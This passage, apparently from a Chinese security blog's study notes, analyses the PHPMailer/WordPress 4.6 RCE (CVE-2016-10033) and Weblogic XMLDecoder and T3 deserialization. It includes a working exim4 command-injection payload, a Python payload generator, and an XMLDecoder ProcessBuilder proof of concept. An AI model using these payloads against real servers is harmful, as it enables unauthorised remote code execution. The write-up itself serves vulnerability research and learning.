class="keyword">$this</span>-&gt;exceptions) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="variable">$exc</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>这个<code>$this-&gt;preSend()</code>一般不会影响到后续，返回的总是<code>True</code>，从而调用到<code>postSend</code></p>
<p>其漏洞对应本质是<code>CVE-2016-10033</code>，参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html" >PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass (legalhackers.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>即<code>PHPMailer</code>这个组件在使用的时候，由于参数没有进行好的过滤，导致最终的代码执行。</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://lorexxar.cn/2016/12/28/cve-2016-10030/" >phpmailer RCE漏洞分析 · LoRexxar’s Blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><strong>mark</strong>没有完整</p>
<p>使用<code>popen</code>，然后<code>sendmail</code>实际在安装了<code>exim4</code>之后，是一个软连接，连接到<code>exim4</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230206115600945.png" alt="image-20230206115600945"></p>
<p>而<code>exim4</code>可以进行命令执行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230206115744705.png" alt="image-20230206115744705"></p>
<p>通过一些正则绕过等，就可以得到最终的<code>payload</code>，需要知道一个用户名，在用邮件验证的时候进行。</p>
<p>创建<code>/tmp/success</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target(any -froot@localhost -be $&#123;run&#123;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bin$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;touch$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;tmp$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;success&#125;&#125; null)</span><br></pre></td></tr></table></div></figure>

<p>对应脚本<code>P神</code>的<code>vulhub</code>里的</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_command</span>(<span class="params">command</span>):</span></span><br><span class="line">    command = <span class="string">&#x27;$&#123;run&#123;%s&#125;&#125;&#x27;</span> % command</span><br><span class="line">    command = command.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;&#x27;</span>)</span><br><span class="line">    command = command.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;target(any -froot@localhost -be %s null)&#x27;</span> % command</span><br><span class="line">host_data = generate_command(<span class="string">&#x27;/bin/bash /tmp/rce&#x27;</span>)</span><br></pre></td></tr></table></div></figure>

<p>最好是放在<code>burpsuite</code>进行，不然容易出错。</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html" >WordPress Core 4.6 - Unauthenticated Remote Code Execution (RCE) PoC Exploit (exploitbox.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="Weblogic"   >
          <a href="#Weblogic" class="heading-link"><i class="fas fa-link"></i></a><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h1>
      
        <h2 id="前置知识"   >
          <a href="#前置知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2>
      
        <h3 id="XMLDecoder反序列化"   >
          <a href="#XMLDecoder反序列化" class="heading-link"><i class="fas fa-link"></i></a><a href="#XMLDecoder反序列化" class="headerlink" title="XMLDecoder反序列化"></a>XMLDecoder反序列化</h3>
      <p>参考如下：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/321222.html" >https://www.freebuf.com/articles/web/321222.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>即<code>XMLDecoder</code>这个组件，可以将对象进行序列化生成特定格式文件<code>xx.xml</code>，然后通过反序列化该<code>xx.xml</code>可以得到对应的对象。</p>
<p>如上述链接提到的<code>Person</code>类</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//必须要有一个无参构造方法，要不会在序列化的过程中报错</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>其中的<code>get/set</code>方法在序列化时会调用到，反序列化时只会调用<code>set</code>方法，如果没有，相关的成员属性的值会丢失。</p>
<p>通过<code>XMLDecode</code>序列化生成如下格式文件</p>
<figure class="highlight xml"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;11.0.9&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;Person&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">void</span> <span class="attr">property</span>=<span class="string">&quot;age&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">int</span>&gt;</span>18<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">void</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">string</span>&gt;</span>test<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>之后进行反序列化即可得到对应的<code>Person</code>对象，相关代码如下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.beans.XMLDecoder;</span><br><span class="line"><span class="keyword">import</span> java.beans.XMLEncoder;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">decode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(test.class.getClassLoader().getResource(<span class="string">&quot;&quot;</span>).getPath() + <span class="string">&quot;config.xml&quot;</span>);</span><br><span class="line">        XMLDecoder xmlDecoder = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            xmlDecoder = <span class="keyword">new</span> XMLDecoder(<span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(file)));</span><br><span class="line">            <span class="comment">//反序列化对象</span></span><br><span class="line">            Object o = xmlDecoder.readObject();</span><br><span class="line">            <span class="keyword">return</span> o;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (xmlDecoder != <span class="keyword">null</span>) &#123;</span><br><span class="line">                xmlDecoder.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">encode</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        XMLEncoder xmlEncoder = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            File file = <span class="keyword">new</span> File(test.class.getClassLoader().getResource(<span class="string">&quot;&quot;</span>).getPath() + <span class="string">&quot;config.xml&quot;</span>);</span><br><span class="line">            xmlEncoder = <span class="keyword">new</span> XMLEncoder(<span class="keyword">new</span> BufferedOutputStream(<span class="keyword">new</span> FileOutputStream(file)));</span><br><span class="line">            <span class="comment">//序列化对象</span></span><br><span class="line">            xmlEncoder.writeObject(o);</span><br><span class="line">            xmlEncoder.flush();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            xmlEncoder.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person(<span class="string">&quot;test&quot;</span>, <span class="number">18</span>);</span><br><span class="line">        encode(person);</span><br><span class="line">        Person result = (Person) decode();</span><br><span class="line">        System.out.println(result);</span><br><span class="line">        <span class="comment">//decode();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>在反序列化的过程中，依据<code>xml</code>中文件内容，依据指定类进行反序列化，并且对应属性赋值。那么就可以找一个可以进行<code>RCE</code>的类，反序列化过程中就可以进行<code>RCE</code>了，相关<code>POC</code>如下</p>
<figure class="highlight xml"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.8.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line"> <span class="comment">&lt;!--反序列化ProcessBuilder--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line"> <span class="comment">&lt;!--传入参数--&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"> <span class="comment">&lt;!--调用方法为start--&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>这里<code>JAVA</code>版本写啥版本都没什么影响，这个<code>xml</code>进行反序列化之后相当于执行代码</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ProcessBuilder proc = <span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">proc.start();</span><br></pre></td></tr></table></div></figure>

<p>导致任意代码执行，具体的<code>XMLDecode</code>里面怎么反序列化的，怎么调用的，函数调用链是什么样子的，还是看如下参考链接吧</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/321222.html" >https://www.freebuf.com/articles/web/321222.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/247331.html" >https://www.freebuf.com/articles/network/247331.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="T3反序列化"   >
          <a href="#T3反序列化" class="heading-link"><i class="fas fa-link"></i></a><a href="#T3反序列化" class="headerlink" title="T3反序列化"></a>T3反序列化</h3>
      <p>参考：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10563#toc-3" >WeblogicT3反序列化浅析之cve-2015-4852 - 先知社区 (aliyun.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.yuque.com/tianxiadamutou/zcfd4v/aevpg0#0af4c320" >Weblogic学习（一）： 初识T3反序列化 (yuque.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>其实主要就是<code>Weblogic</code>对于<code>T3</code>协议的处理，<code>T3</code>协议对于<code>Weblogica</code>而言，也就相当于<code>JRMP</code>协议对于原生的<code>Java</code>程序，都是用来<code>RMI</code>即远程方法调用的。</p>

        <h4 id="RMI-JRMP"   >
          <a href="#RMI-JRMP" class="heading-link"><i class="fas fa-link"></i></a><a href="#RMI-JRMP" class="headerlink" title="RMI/JRMP"></a>RMI/JRMP</h4>
      <p>关于<code>RMI</code>以及<code>JRMP</code>，感觉下面几篇文章挺好的</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7079" >基于Java反序列化RCE - 搞懂RMI、JRMP、JNDI - 先知社区 (aliyun.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7264#toc-0" >搞懂RMI、JRMP、JNDI-终结篇 - 先知社区 (aliyun.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://wx.zsxq.com/dweb2/index/topic_detail/844112455528482" >P神的三篇RMI机制分析</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>就个人理解而言，画个图好解释一下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208124253918.png" alt="image-20230208124253918"></p>
<p>代码参照的是：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7079" >基于Java反序列化RCE - 搞懂RMI、JRMP、JNDI - 先知社区 (aliyun.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<ul>
<li><p><code>Server</code>相关类实现如下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">HelloService</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">  <span class="function">String <span class="title">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//重写了sayHello</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServiceImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">HelloService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="title">HelloServiceImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;hello!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello!&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>Client</code>相关类实现如下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">HelloService</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function">String <span class="title">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//并没有实现sayHello</span></span><br></pre></td></tr></table></div></figure></li>
</ul>
<p>总结来说，就是<code>Server</code>和<code>Client</code>共用一个接口，<code>Client</code>调用<code>Server</code>重写的接口。</p>
<p>首先<code>Server</code>重写该接口生成对象，将重写之后的对象进行动态代理序列化后上传到注册中心作为存根<code>stub</code>。然后<code>Client</code>就可以从注册中心<code>register</code>下载<code>Server</code>重写该接口的动态代理对象存根<code>stub</code>，将之反序列化后进行动态代理即可调用到<code>Server</code>重写的接口函数了。</p>
<p>这里提到<code>stub</code>对象不是对应的<code>HelloServiceImpl</code>对象，而是<code>JAVA</code>动态代理对象，里面存储了如何跟服务端联系的信息，以及封装了RMI的通讯实现细节，也就是对于<code>sayHello</code>重写的代码并没有保存在这个<code>stub</code>对象中，还是保存在服务器上，调用的时候还是远程调用。</p>
<p>还有更加详细的关于动态代理对象的解释可以看看奇安信<code>A-team</code>的师傅写的<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247485058&idx=1&sn=d22b310acf703a32d938a7087c8e8704" >WebLogic安全研究报告 (qq.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，感觉写的很好，如下图</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208124814148.png" alt="image-20230208124814148"></p>
<p>需要注意的是，服务端<code>Server</code>和注册中心<code>register</code>其实是可以放在一台机器上的。</p>
<p>感觉这个过程更像是一个<code>RSA</code>过程，服务器生成私钥(<code>stub</code>)给客户，公开公钥(<code>register</code>以及<code>Skeleton</code>)，借助这两方完成通信。</p>

        <h5 id="序列化漏洞"   >
          <a href="#序列化漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#序列化漏洞" class="headerlink" title="序列化漏洞"></a>序列化漏洞</h5>
      <p>在这个过程中进行通信所用到的协议就是<code>JRMP</code>协议，其中进行数据传输的过程中，无论是客户端还是服务端，都会用到<code>JAVA</code>反序列化和序列化，<strong>盗用一下奇安信师傅的图，2333</strong></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208121353125.png" alt="image-20230208121353125"></p>
<p>也就是基本都会存在漏洞，但是爆出来洞之后基本也会有相关的黑名单限制。可以参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/escape-w/p/16107675.html" >从ysoserial讲RMI/JRMP反序列化漏洞 - Escape-w - 博客园 (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h4 id="T3协议"   >
          <a href="#T3协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#T3协议" class="headerlink" title="T3协议"></a>T3协议</h4>
      <p>对于<code>T3</code>也是类似的，<strong>盗用一下奇安信师傅的图，2333</strong></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208114134211.png" alt="image-20230208114134211"></p>

        <h5 id="漏洞原理-1"   >
          <a href="#漏洞原理-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h5>
      <p>而对于使用<code>T3</code>协议，其数据包结构</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208122112606.png" alt="image-20230208122112606"></p>
<p>替换之后，当服务器接收到恶意的数据，对其中的一些序列化数据进行反序列化是，就会导致恶意对象被反序列化，从而引发反序列化漏洞。</p>

        <h5 id="攻击方式"   >
          <a href="#攻击方式" class="heading-link"><i class="fas fa-link"></i></a><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h5>
      <p>相关的攻击方式就比如说在自己服务器生成一个注册中心，可控受害者的反序列化时就可以让其使用<code>RMI</code>机制。从自己服务器获取恶意的<code>stub</code>对象，然后在受害者再对该<code>stub</code>进行反序列化时即可完成攻击。</p>
<p>（因为可控受害者的反序列化的过程中可能会碰到黑名单限制，无法轻松完成<code>CC</code>链之类的攻击，所以借助原生<code>RMI</code>机制，详见<code>CVE-2015-4852</code>之后关于<code>T3</code>的漏洞。另外借助原生的<code>RMI</code>机制其实也可能会有黑名单限制，这个就需要自己绕过，或者找现成的<code>payload</code>来打了，参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/228918%EF%BC%89" >https://www.anquanke.com/post/id/228918）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="CVE-2017-10271"   >
          <a href="#CVE-2017-10271" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h2>
      <p>Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞</p>

        <h3 id="环境搭建"   >
          <a href="#环境搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10172#toc-1" >https://xz.aliyun.com/t/10172#toc-1</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>记得最后把<code>docker</code>重启一下就行</p>

        <h3 id="漏洞分析"   >
          <a href="#漏洞分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3>
      <p>漏洞点在<code>/wls-wsat/</code>提供的页面上，当<code>POST</code>请求规范的<code>XML</code>数据访问该组件下对应的页面，会进入到<code>weblogic/wsee/jaxws/workcontext/WorkContextServerTube</code>类中的<code>processRequest</code>方法，进行数据包的处理。</p>
<p>相关分析流程可以参考：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/102768#h2-6" >https://www.anquanke.com/post/id/102768#h2-6</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
